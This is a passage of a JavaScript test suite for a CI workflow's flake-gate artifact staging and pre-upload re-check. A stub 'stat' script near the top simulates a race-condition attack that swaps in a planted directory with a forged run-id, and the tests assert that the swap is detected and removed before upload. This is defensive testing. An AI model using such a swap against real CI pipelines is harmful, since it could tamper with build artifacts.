          GITHUB_RUN_ATTEMPT: '1',
        },
        encoding: 'utf8',
        timeout: 30_000,
      },
    );
  };

  // Models the kill-race survivor deterministically: the plant lands in
  // the window AFTER the home_id capture (the 2nd stat call reads the
  // genuine state first) and BEFORE the cd opens the directory — the
  // inner re-stat must detect the mismatch, and the detection must
  // REMOVE the plant, not merely abort on it.
  const STUB_STAT_SWAP = [
    '#!/bin/bash',
    'n_file="$RUNNER_TEMP/.stat-count"',
    'n=$(cat "$n_file" 2>/dev/null || echo 0)',
    'echo $((n+1)) > "$n_file"',
    'out="$(/usr/bin/stat "$@")"',
    'if [ "$n" -eq 1 ] && [ ! -e "$RUNNER_TEMP/flake-gate.real" ]; then',
    '  mv "$RUNNER_TEMP/flake-gate" "$RUNNER_TEMP/flake-gate.real"',
    '  mkdir "$RUNNER_TEMP/flake-gate"',
    '  chmod 700 "$RUNNER_TEMP/flake-gate"',
    '  echo PLANT-MARKER > "$RUNNER_TEMP/flake-gate/plant-marker"',
    '  echo 777-1 > "$RUNNER_TEMP/flake-gate/run-id"',
    'fi',
    'printf "%s\\n" "$out"',
    '',
  ].join('\n');

  it('a swap detected by the opened-directory re-check is removed, never left to the always() upload', () => {
    const rt = mkdtempSync(join(stageRoot, 'swap-'));
    const bin = join(stageRoot, 'bin-swap');
    mkdirSync(bin, { recursive: true });
    writeFileSync(join(bin, 'stat'), STUB_STAT_SWAP);
    chmodSync(join(bin, 'stat'), 0o755);
    makeHome(rt, { files: { log: 'genuine gate log\n' } });
    const res = runStaging(rt, bin);
    assert.equal(
      res.status,
      0,
      `staging must survive a detected swap: ${res.stderr}`,
    );
    assert.ok(
      !existsSync(join(rt, 'flake-gate')),
      'the swapped-in tree must be removed — the always() upload enumerates this path unconditionally',
    );
    assert.ok(
      existsSync(join(rt, 'flake-gate.real')),
      'sanity: the stub stashed the genuine home',
    );
  });

  it('a genuine home still rebuilds the upload tree with the authoritative log', () => {
    const rt = mkdtempSync(join(stageRoot, 'clean-'));
    const bin = join(stageRoot, 'bin-clean');
    mkdirSync(bin, { recursive: true });
    // install/chown/chmod need root in production; the harness stubs the
    // ownership plumbing and keeps the real directory creation.
    for (const [name, body] of [
      ['install', '#!/bin/bash\nmkdir -p "${@: -1}"\n'],
      ['chown', '#!/bin/bash\nexit 0\n'],
      ['chmod', '#!/bin/bash\nexit 0\n'],
    ]) {
      writeFileSync(join(bin, name), body);
      chmodSync(join(bin, name), 0o755);
    }
    makeHome(rt, { files: { log: 'genuine gate log\n' } });
    const res = runStaging(rt, bin);
    assert.equal(res.status, 0, res.stderr);
    assert.equal(
      readFileSync(join(rt, 'flake-gate', 'upload', 'flake-gate.log'), 'utf8'),
      'genuine gate log\n',
      'the authoritative log must land in the rebuilt upload tree',
    );
  });

  const runRecheck = (rt) => {
    const out = join(rt, 'github-output');
    writeFileSync(out, '');
    const res = spawnSync(
      'bash',
      [
        '--noprofile',
        '--norc',
        '-e',
        '-o',
        'pipefail',
        '-c',
        recheckStep.run.replaceAll(
          'GATE_DIR=/flake-gate',
          `GATE_DIR=${join(rt, 'flake-gate')}`,
        ),
      ],
      {
        env: {
          ...process.env,
          // Step-env parity with the gate harness (POSIXLY_CORRECT
          // startup defence included) — literal values only.
          ...Object.fromEntries(
            Object.entries(recheckStep.env).filter(
              ([, v]) => typeof v === 'string' && !v.includes('${{'),
            ),
          ),
          RUNNER_TEMP: rt,
          GITHUB_OUTPUT: out,
          GITHUB_RUN_ID: '777',
          GITHUB_RUN_ATTEMPT: '1',
        },
        cwd: rt,
        encoding: 'utf8',
        timeout: 30_000,
      },
    );
    const outputs = Object.fromEntries(
      readFileSync(out, 'utf8')
        .split('\n')
        .filter((l) => l.includes('='))
        .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]),
    );
    return { res, outputs };
  };

  it('the pre-upload re-check removes a stale or planted home and gates the upload', () => {
    const bad = mkdtempSync(join(stageRoot, 'recheck-bad-'));
    makeHome(bad, { runId: '666-9' });
    mkdirSync(join(bad, 'flake-gate', 'upload'), { recursive: true });
    const rejected = runRecheck(bad);
    assert.equal(rejected.res.status, 0, rejected.res.stderr);
    assert.equal(rejected.outputs.upload_ok, 'false');
    assert.ok(
      !existsSync(join(bad, 'flake-gate')),
      'a home that fails the re-check must be removed before the upload enumerates it',
    );
    const good = mkdtempSync(join(stageRoot, 'recheck-good-'));
    makeHome(good);
    mkdirSync(join(good, 'flake-gate', 'upload'), { recursive: true });
    const accepted = runRecheck(good);
    assert.equal(accepted.res.status, 0, accepted.res.stderr);
    assert.equal(accepted.outputs.upload_ok, 'true');
    assert.ok(existsSync(join(good, 'flake-gate', 'upload')));
  });
});
